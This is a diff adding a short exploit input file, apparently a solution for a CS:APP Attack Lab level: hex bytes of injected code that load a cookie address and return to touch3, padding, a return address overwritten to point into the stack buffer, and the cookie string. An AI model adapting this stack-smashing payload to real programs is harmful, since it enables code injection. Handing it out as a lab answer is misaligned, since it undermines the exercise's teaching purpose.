@@ -1,0 +1,11 @@
+48 c7 c7 a8 dc 61 55    /* mov    $0x5561dca8,%rdi  -- Passing a parameter to function touch3 */
+68 fa 18 40 00          /* pushq  $0x4018fa         -- Address of function touch3 */
+c3                      /* retq                     -- Move to function touch3 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00
+78 dc 61 55 00 00 00 00 /* Jump to 0x5561dc78, address of buffer */
+35 39 62 39 39 37 66 61 /* Cookie (as a string) */
+
+
